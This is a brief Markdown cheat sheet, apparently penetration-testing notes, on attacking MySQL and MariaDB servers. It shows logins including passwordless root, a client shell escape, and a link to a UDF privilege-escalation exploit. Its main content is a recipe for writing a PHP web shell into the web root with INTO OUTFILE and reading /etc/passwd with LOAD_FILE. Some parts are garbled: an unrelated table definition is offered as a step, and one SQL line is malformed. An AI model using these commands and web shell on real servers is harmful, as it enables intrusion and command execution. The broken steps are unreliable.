# MySQL Hacking

## Login
For mysql including Mariadb:
```bash
mysql -u $username -p $password -h $HOST
mysql -u root -h $HOST

mysql>\! sh # run a sh shell from mysql!
```

## Misconfigurations

[Raptor.c](https://github.com/1N3/PrivEsc/blob/master/mysql/raptor_udf.c)

## Exploit 

The basic methodology for exploiting MySQL:
-   Access the remote database using administrator credentials
-   Create a new table in the main database
-   Inject PHP code to gain command execution
	    Example code: `<?php $cmd=$_GET["cmd"];system($cmd);?>`  
-   Drop table contents onto a file the user can access  
-   Execute and obtain RCE on the host.


Either 

```sql
CREATE TABLE users(
id INT AUTO_INCREMENT,
   first_name VARCHAR(100),
   last_name VARCHAR(100),
   email VARCHAR(50),
   password VARCHAR(20),
   location VARCHAR(100),
   dept VARCHAR(100),
   is_admin TINYINT(1),
   register_date DATETIME,
   PRIMARY KEY(id)
);
```

Or use `SELECT * LOAD_FILE('/etc/passwd')`

  `select '<?php $cmd=$_GET["cmd"];system($cmd);?>' INTO OUTFILE '/var/www/html/shell.php';`